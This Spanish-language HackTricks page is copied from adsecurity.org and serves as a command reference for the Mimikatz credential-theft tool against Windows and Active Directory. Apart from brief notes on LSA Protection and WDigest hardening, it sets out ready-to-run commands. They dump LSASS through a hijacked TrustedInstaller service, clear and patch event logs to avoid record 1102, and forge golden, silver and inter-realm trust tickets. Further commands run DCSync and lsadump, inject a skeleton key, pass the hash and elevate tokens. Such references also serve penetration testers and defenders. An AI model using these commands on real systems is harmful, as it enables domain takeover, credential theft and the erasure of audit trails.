# Mimikatz

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

El contenido de esta página fue copiado de [adsecurity.org](https://adsecurity.org/?page\_id=1821)

## LM y texto claro en memoria

A partir de Windows 8.1 y Windows Server 2012 R2, el hash LM y la contraseña en "texto claro" ya no están en la memoria.

Para evitar que la contraseña en "texto claro" se coloque en LSASS, la siguiente clave del registro debe establecerse en "0" (Digest Disabled):

_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest “UseLogonCredential”(DWORD)_

## **Mimikatz y Protección LSA:**

Windows Server 2012 R2 y Windows 8.1 incluyen una nueva característica llamada Protección LSA que implica habilitar [LSASS como un proceso protegido en Windows Server 2012 R2](https://technet.microsoft.com/en-us/library/dn408187.aspx) (Mimikatz puede evadirlo con un controlador, pero eso debería generar algo de ruido en los registros de eventos):

_El LSA, que incluye el proceso Local Security Authority Server Service (LSASS), valida a los usuarios para iniciar sesión local y remota y hace cumplir las políticas de seguridad locales. El sistema operativo Windows 8.1 proporciona protección adicional para el LSA para evitar la lectura de memoria e inyección de código por procesos no protegidos. Esto proporciona seguridad adicional para las credenciales que el LSA almacena y gestiona._

Habilitar la protección LSA:

1. Abre el Editor del Registro (RegEdit.exe) y navega hasta la clave del registro que se encuentra en: HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa y establece el valor de la clave del registro en: “RunAsPPL”=dword:00000001.
2. Crea una nueva GPO y navega hasta Configuración del equipo, Preferencias, Configuración de Windows. Haz clic con el botón derecho en Registro, apunta a Nuevo y luego haz clic en Elemento de Registro. Aparecerá el cuadro de diálogo Propiedades de Registro nuevo. En la lista de Hive, haz clic en HKEY\_LOCAL\_MACHINE. En la lista de Ruta de clave, navega hasta SYSTEM\CurrentControlSet\Control\Lsa. En el cuadro de nombre de valor, escribe RunAsPPL. En el cuadro de tipo de valor, haz clic en REG\_DWORD. En el cuadro de datos de valor, escribe 00000001. Haz clic en Aceptar.

La Protección LSA evita que los procesos no protegidos interactúen con LSASS. Mimikatz aún puede evadir esto con un controlador ("!+").
```
sc config TrustedInstaller binPath= "C:\Users\Public\procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp"
sc start TrustedInstaller
```
[![TrustedInstaller-Dump-Lsass](https://1860093151-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-M6yZUYP7DLMbZuztKpV%2Fuploads%2FJtprjloNPADNSpb6S0DS%2Fimage.png?alt=media&token=9b639459-bd4c-4897-90af-8990125fa058)

Este archivo de volcado se puede exfiltrar a una computadora controlada por un atacante donde las credenciales pueden ser extraídas.
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Principal

### **EVENTO**

**EVENTO::Limpiar** – Limpiar un registro de eventos\
[\
![Mimikatz-Evento-Limpiar](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)

**EVENTO:::Desactivar** – (_**experimental**_) Parchear el servicio de Eventos para evitar nuevos eventos

[![Mimikatz-Evento-Desactivar](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)

Nota:\
Ejecutar privilege::debug y luego event::drop para parchear el registro de eventos. Luego ejecutar Evento::Limpiar para borrar el registro de eventos sin que se registre ningún evento de borrado de registro (1102).

### KERBEROS

#### Tique Dorado

Un Tique Dorado es un TGT que utiliza el hash de contraseña NTLM de KRBTGT para cifrar y firmar.

Un Tique Dorado (GT) puede ser creado para suplantar a cualquier usuario (real o imaginario) en el dominio como miembro de cualquier grupo en el dominio (proporcionando una cantidad virtualmente ilimitada de derechos) para cualquier recurso en el dominio.

**Referencia de Comando de Tique Dorado de Mimikatz:**

El comando de Mimikatz para crear un tique dorado es "kerberos::golden"

* /dominio – el nombre de dominio completamente calificado. En este ejemplo: "lab.adsecurity.org".
* /sid – el SID del dominio. En este ejemplo: "S-1-5-21-1473643419-774954089-2222329127".
* /sids – SIDs adicionales para cuentas/grupos en el bosque de AD con derechos que desea que el tique suplante. Típicamente, este será el grupo Administradores de Empresa para el dominio raíz "S-1-5-21-1473643419-774954089-5872329127-519". [Este parámetro añade los SIDs proporcionados al parámetro de Historial de SID.](https://adsecurity.org/?p=1640)
* /usuario – nombre de usuario a suplantar
* /grupos (opcional) – RIDs de grupos de los que el usuario es miembro (el primero es el grupo principal).\
Agregar RIDs de cuentas de usuario o computadora para recibir el mismo acceso.\
Grupos Predeterminados: 513,512,520,518,519 para los grupos de Administradores conocidos (listados abajo).
* /krbtgt – hash de contraseña NTLM para la cuenta de servicio KDC del dominio (KRBTGT). Utilizado para cifrar y firmar el TGT.
* /tique (opcional) – proporcionar una ruta y nombre para guardar el archivo del Tique Dorado para uso posterior o usar /ptt para inyectar inmediatamente el tique dorado en memoria para su uso.
* /ptt – como alternativa a /tique – usar esto para inyectar inmediatamente el tique falsificado en memoria para su uso.
* /id (opcional) – RID de usuario. El valor predeterminado de Mimikatz es 500 (el RID de la cuenta de Administrador predeterminada).
* /inicioffset (opcional) – el desplazamiento de inicio cuando el tique está disponible (generalmente establecido en -10 o 0 si se usa esta opción). El valor predeterminado de Mimikatz es 0.
* /terminaen (opcional) – tiempo de vida del tique. El valor predeterminado de Mimikatz es 10 años (\~5,262,480 minutos). La configuración de política de Kerberos predeterminada de Active Directory es 10 horas (600 minutos).
* /renovmax (opcional) – tiempo de vida máximo del tique con renovación. El valor predeterminado de Mimikatz es 10 años (\~5,262,480 minutos). La configuración de política de Kerberos predeterminada de Active Directory es 7 días (10,080 minutos).
* /sids (opcional) – establecer como el SID del grupo Administradores de Empresa en el bosque de AD (\[SIDDominioRaízAD]-519) para suplantar derechos de Administrador de Empresa en todo el bosque de AD (admin de AD en cada dominio en el Bosque de AD).
* /aes128 – la clave AES128
* /aes256 – la clave AES256

Grupos Predeterminados de Tique Dorado:

* SID de Usuarios de Dominio: S-1-5-21\<IDDOMINIO>-513
* SID de Administradores de Dominio: S-1-5-21\<IDDOMINIO>-512
* SID de Administradores de Esquema: S-1-5-21\<IDDOMINIO>-518
* SID de Administradores de Empresa: S-1-5-21\<IDDOMINIO>-519 (esto solo es efectivo cuando el tique falsificado es creado en el dominio raíz del Bosque, aunque se agrega usando el parámetro /sids para derechos de admin de AD en todo el Bosque de AD)
* SID de Propietarios de Política de Grupo Creadores: S-1-5-21\<IDDOMINIO>-520
```
.\mimikatz "kerberos::golden /User:Administrator /domain:rd.lab.adsecurity.org /id:512 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
```
[Tickets dorados en diferentes dominios](https://adsecurity.org/?p=1640)

#### Ticket de Plata

Un Ticket de Plata es un TGS (similar al TGT en formato) que utiliza el hash de contraseña NTLM de la cuenta de servicio objetivo (identificada por el mapeo SPN) para cifrar y firmar.

**Ejemplo de Comando Mimikatz para Crear un Ticket de Plata:**

El siguiente comando de Mimikatz crea un Ticket de Plata para el servicio CIFS en el servidor adsmswin2k8r2.lab.adsecurity.org. Para que este Ticket de Plata se cree con éxito, es necesario descubrir el hash de contraseña de la cuenta de equipo de AD para adsmswin2k8r2.lab.adsecurity.org, ya sea desde un volcado de dominio AD o ejecutando Mimikatz en el sistema local como se muestra arriba (_Mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit_). El hash de contraseña NTLM se utiliza con el parámetro /rc4. También es necesario identificar el tipo de SPN de servicio en el parámetro /service. Finalmente, el nombre de dominio completo del equipo objetivo debe proporcionarse en el parámetro /target. No olvides el SID del dominio en el parámetro /sid.
```
mimikatz “kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit
```
#### [**Trust Ticket**](https://adsecurity.org/?p=1588)

Una vez que se determina el hash de la contraseña de confianza de Active Directory, se puede generar un trust ticket. Los trust tickets se crean utilizando la contraseña compartida entre 2 Dominios que confían entre sí.\
[Más información sobre Trust Tickets.](https://adsecurity.org/?p=1588)

**Volcado de contraseñas de confianza (claves de confianza)**
```
Mimikatz “privilege::debug” “lsadump::trust /patch” exit
```
**Crear un ticket de confianza falsificado (TGT entre reinos) usando Mimikatz**

Forjar el ticket de confianza que indica que el titular del ticket es un Administrador de Empresa en el Bosque de AD (aprovechando SIDHistory, "sids", a través de confianzas en Mimikatz, mi "contribución" a Mimikatz). Esto permite acceso administrativo completo desde un dominio secundario al dominio principal. Ten en cuenta que esta cuenta no tiene que existir en ningún lugar, ya que es efectivamente un Golden Ticket a través de la confianza.
```
Mimikatz “Kerberos::golden /domain:child.lab.adsecurity.org /sid:S-1-5-21-3677078698-724690114-1972670770 /sids:S-1-5-21-1581655573-3923512380-696647894-519 /rc4:49ed1653275f78846ff06de1a02386fd /user:DarthVader /service:krbtgt /target:lab.adsecurity.org /ticket:c:\temp\tickets\EA-ADSECLABCHILD.kirbi” exit
```
### Trust Ticket Parámetros Específicos Requeridos:

* \*\*/\*\*target – el FQDN del dominio objetivo.
* \*\*/\*\*service – el servicio kerberos en ejecución en el dominio objetivo (krbtgt).
* \*\*/\*\*rc4 – el hash NTLM para la cuenta de servicio del servicio kerberos (krbtgt).
* \*\*/\*\*ticket – proporciona una ruta y nombre para guardar el archivo de ticket falsificado para su uso posterior o usa /ptt para inyectar inmediatamente el ticket dorado en la memoria para su uso.

#### **Más KERBEROS**

**KERBEROS::List** – Lista todos los tickets de usuario (TGT y TGS) en la memoria del usuario. No se requieren privilegios especiales ya que solo muestra los tickets del usuario actual.\
Similar a la funcionalidad de "klist".

**KERBEROS::PTC** – pasar la caché (NT6)\
Los sistemas *Nix como Mac OS, Linux, BSD, Unix, etc. almacenan en caché las credenciales de Kerberos. Estos datos en caché pueden ser copiados y pasados utilizando Mimikatz. También es útil para inyectar tickets de Kerberos en archivos ccache.

Un buen ejemplo de kerberos::ptc de Mimikatz es cuando [se explota MS14-068 con PyKEK](https://adsecurity.org/?p=676). PyKEK genera un archivo ccache que puede ser inyectado con Mimikatz usando kerberos::ptc.

**KERBEROS::PTT** – pasar el ticket\
Después de que se encuentra un [ticket de Kerberos](https://adsecurity.org/?p=1667), puede ser copiado a otro sistema y pasado a la sesión actual simulando efectivamente un inicio de sesión sin ninguna comunicación con el Controlador de Dominio. No se requieren derechos especiales.\
Similar a SEKURLSA::PTH (Pass-The-Hash).

* /nombre_archivo – el nombre del ticket (puede ser múltiple)
* /directorio – una ruta de directorio, todos los archivos .kirbi dentro serán inyectados.

**KERBEROS::Purge** – purgar todos los tickets de Kerberos\
Similar a la funcionalidad de "klist purge". Ejecute este comando antes de pasar tickets (PTC, PTT, etc) para asegurar que se utilice el contexto de usuario correcto.

**KERBEROS::TGT** – obtener el TGT actual para el usuario actual.

### LSADUMP

**LSADUMP**::**DCShadow** – Establece las máquinas actuales como DC para tener la capacidad de crear nuevos objetos dentro del DC (método persistente).\
Esto requiere derechos de administrador completo de AD o el hash de contraseña de KRBTGT.\
DCShadow establece temporalmente la computadora como un "DC" con el propósito de replicación:

* Crea 2 objetos en la partición de Configuración del bosque AD.
* Actualiza el SPN de la computadora utilizada para incluir "GC" (Catálogo Global) y "E3514235-4B06-11D1-AB04-00C04FC2DCD2" (Replicación de AD). Más información sobre los Nombres Principales de Servicio de Kerberos en la [sección SPN de ADSecurity](https://adsecurity.org/?page\_id=183).
* Envía las actualizaciones a los DC a través de DrsReplicaAdd y KCC.
* Elimina los objetos creados de la partición de Configuración.

**LSADUMP::DCSync** – solicita a un DC sincronizar un objeto (obtener datos de contraseña de la cuenta)\
[Requiere membresía en Administrador de Dominio, Administradores de Dominio o delegación personalizada.](https://adsecurity.org/?p=1729)

Una característica importante añadida a Mimikatz en agosto de 2015 es "DCSync" que efectivamente "suplanta" a un Controlador de Dominio y solicita datos de contraseña de cuenta del Controlador de Dominio objetivo.

**Opciones de DCSync:**

* /all – DCSync extrae datos para todo el dominio.
* /usuario – ID de usuario o SID del usuario del que desea extraer los datos.
* /dominio (opcional) – FQDN del dominio de Active Directory. Mimikatz descubrirá un DC en el dominio al que conectarse. Si este parámetro no se proporciona, Mimikatz se establece en el dominio actual de forma predeterminada.
* /csv – exportar a csv
* /dc (opcional) – Especifica el Controlador de Dominio al que desea que DCSync se conecte y recopile datos.

También hay un parámetro /guid.

**Ejemplos de Comandos DCSync:**

Extraer datos de contraseña para la cuenta de usuario KRBTGT en el dominio rd.adsecurity.org:\
_Mimikatz "lsadump::dcsync /dominio:rd.adsecurity.org /usuario:krbtgt" exit_

Extraer datos de contraseña para la cuenta de usuario Administrador en el dominio rd.adsecurity.org:\
_Mimikatz "lsadump::dcsync /dominio:rd.adsecurity.org /usuario:Administrador" exit_

Extraer datos de contraseña para la cuenta de computadora del Controlador de Dominio ADSDC03 en el dominio lab.adsecurity.org:\
_Mimikatz "lsadump::dcsync /dominio:lab.adsecurity.org /usuario:adsdc03$" exit_

**LSADUMP::LSA** – Solicitar al Servidor LSA recuperar SAM/AD empresarial (normal, parche sobre la marcha o inyectar). Use /patch para un subconjunto de datos, use /inject para todo. _Requiere derechos de Sistema o Depuración._

* /inject – Inyectar LSASS para extraer credenciales
* /nombre – nombre de cuenta para la cuenta de usuario objetivo
* /id – RID para la cuenta de usuario objetivo
* /patch – parchear LSASS.

A menudo, las cuentas de servicio son miembros de Administradores de Dominio (o equivalente) o un Administrador de Dominio se ha conectado recientemente a la computadora desde la que un atacante puede extraer credenciales. Utilizando estas credenciales, un atacante puede acceder a un Controlador de Dominio y obtener todas las credenciales del dominio, incluido el hash NTLM de la cuenta KRBTGT que se utiliza para crear Tickets Dorados de Kerberos.
```
mimikatz lsadump::lsa /inject exit
```
**LSADUMP::NetSync**

NetSync proporciona una forma sencilla de utilizar los datos de la contraseña de una cuenta de computadora DC para hacerse pasar por un Controlador de Dominio a través de un Silver Ticket y DCSync la información de la cuenta objetivo, incluidos los datos de la contraseña.

**LSADUMP::SAM** – obtener el SysKey para descifrar las entradas SAM (del registro o hive). La opción SAM se conecta a la base de datos local del Administrador de Cuentas de Seguridad (SAM) y extrae credenciales para cuentas locales.

**LSADUMP::Secrets** – obtener el SysKey para descifrar las entradas SECRETS (del registro o hives).

**LSADUMP::SetNTLM** – Solicitar a un servidor que establezca una nueva contraseña/ntlm para un usuario.

[**LSADUMP::Trust**](https://adsecurity.org/?p=1588) – Solicitar al Servidor LSA que recupere la Información de Autenticación de Confianza (normal o parche sobre la marcha).

### MISC

[**MISC::Skeleton**](https://adsecurity.org/?p=1275) – Inyectar una Clave Skeleton en el proceso LSASS en el Controlador de Dominio.
```
"privilege::debug" "misc::skeleton"
```
### PRIVILEGIO

**PRIVILEGE::Backup** - obtener privilegios/derechos de respaldo. Requiere derechos de depuración.

**PRIVILEGE::Debug** - obtener derechos de depuración (esto o derechos del Sistema Local son necesarios para muchos comandos de Mimikatz).

### SEKURLSA

**SEKURLSA::Credman** - Lista el Administrador de Credenciales

**SEKURLSA::Ekeys** - Lista las claves de cifrado Kerberos

**SEKURLSA::Kerberos** - Lista las credenciales Kerberos de todos los usuarios autenticados (incluidos servicios y cuentas de computadora)

**SEKURLSA::Krbtgt** - obtener datos de la contraseña de la cuenta de servicio Kerberos del Dominio (KRBTGT)

**SEKURLSA::SSP** - Lista las credenciales SSP

**SEKURLSA::Wdigest** - Lista las credenciales WDigest

**SEKURLSA::LogonPasswords** - lista todas las credenciales de proveedores disponibles. Esto suele mostrar las credenciales de usuario y computadora que han iniciado sesión recientemente.

* Vuelca datos de contraseña en LSASS para las cuentas que han iniciado sesión actualmente (o recientemente) así como los servicios que se ejecutan bajo el contexto de las credenciales de usuario.
* Las contraseñas de las cuentas se almacenan en memoria de forma reversible. Si están en memoria (antes de Windows 8.1/Windows Server 2012 R2 lo estaban), se muestran. Windows 8.1/Windows Server 2012 R2 no almacena la contraseña de la cuenta de esta manera en la mayoría de los casos. KB2871997 "retrocede" esta capacidad de seguridad a Windows 7, Windows 8, Windows Server 2008R2 y Windows Server 2012, aunque la computadora necesita una configuración adicional después de aplicar KB2871997.
* Requiere acceso de administrador (con derechos de depuración) o derechos del Sistema Local

**SEKURLSA::Minidump** - cambia al contexto del proceso de minivolcado de LSASS (lee el volcado de lsass)

**SEKURLSA::Pth** - Pass-the-Hash y Over-Pass-the-Hash (también conocido como pasar la clave).

_Mimikatz puede realizar la operación conocida como 'Pass-The-Hash' para ejecutar un proceso bajo otras credenciales con el hash NTLM de la contraseña del usuario, en lugar de su contraseña real. Para esto, inicia un proceso con una identidad falsa, luego reemplaza la información falsa (hash NTLM de la contraseña falsa) con la información real (hash NTLM de la contraseña real)._

* /user - el nombre de usuario que deseas suplantar, ten en cuenta que Administrador no es el único nombre para esta cuenta conocida.
* /domain - el nombre de dominio completamente calificado - sin dominio o en caso de usuario/administrador local, usa el nombre de la computadora o servidor, grupo de trabajo o lo que sea.
* /rc4 o /ntlm - opcional - la clave RC4 / hash NTLM de la contraseña del usuario.
* /run - opcional - la línea de comandos a ejecutar - por defecto es: cmd para tener una shell.

[![Mimikatz-Sekurlsa-PTH](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)

**SEKURLSA::Tickets** - Lista todos los tickets Kerberos disponibles para todos los usuarios autenticados recientemente, incluidos los servicios que se ejecutan bajo el contexto de una cuenta de usuario y la cuenta de computadora AD local.\
A diferencia de kerberos::list, sekurlsa utiliza la lectura de memoria y no está sujeto a restricciones de exportación de claves. sekurlsa puede acceder a los tickets de otras sesiones (usuarios).

* /export - opcional - los tickets se exportan en archivos .kirbi. Comienzan con el LUID del usuario y el número de grupo (0 = TGS, 1 = ticket de cliente(?) y 2 = TGT)

Similar al volcado de credenciales de LSASS, utilizando el módulo sekurlsa, un atacante puede obtener todos los datos de tickets Kerberos en memoria en un sistema, incluidos los pertenecientes a un administrador o servicio.\
Esto es extremadamente útil si un atacante ha comprometido un servidor web configurado para la delegación de Kerberos al que los usuarios acceden con un servidor SQL de backend. Esto permite a un atacante capturar y reutilizar todos los tickets de usuario en memoria en ese servidor.

El comando "kerberos::tickets" de mimikatz vuelca los tickets Kerberos del usuario que ha iniciado sesión actualmente y no requiere derechos elevados. Aprovechando la capacidad del módulo sekurlsa para leer desde la memoria protegida (LSASS), se pueden volcar todos los tickets Kerberos en el sistema.

Comando: _mimikatz sekurlsa::tickets exit_

* Vuelca todos los tickets Kerberos autenticados en un sistema.
* Requiere acceso de administrador (con depuración) o derechos del Sistema Local

### **SID**

El módulo SID de Mimikatz reemplaza MISC::AddSID. Usa SID::Patch para parchear el servicio ntds.

**SID::add** - Agrega un SID al historial de SID de un objeto

[![Mimikatz-SID-add](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)

**SID::modify** - Modifica el SID del objeto de un objeto

[![Mimikatz-SID-Modify](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)

### **TOKEN**

El módulo Token de Mimikatz permite a Mimikatz interactuar con tokens de autenticación de Windows, incluyendo la obtención e impersonación de tokens existentes.

**TOKEN::Elevate** - impersonar un token. Se utiliza para elevar permisos a SYSTEM (por defecto) o encontrar un token de administrador de dominio en la máquina utilizando la API de Windows.\
_Requiere derechos de administrador._

[![Mimikatz-Token-Elevate1](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)

Encuentra una credencial de administrador de dominio en la máquina y usa ese token: _token::elevate /domainadmin_

[![Mimikatz-Token-Elevate-DomainAdmin](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)

**TOKEN::List** - lista todos los tokens del sistema

### **TS**

**TS::MultiRDP** - (experimental) Parchea el servicio de Terminal Server para permitir múltiples usuarios

[![Mimikatz-TS-MultiRDP](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png)

**TS::Sessions** - Lista sesiones TS/RDP.

![](https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-TS-Sessions.png)

### Bóveda

`mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"` - Obtener contraseñas de tareas programadas
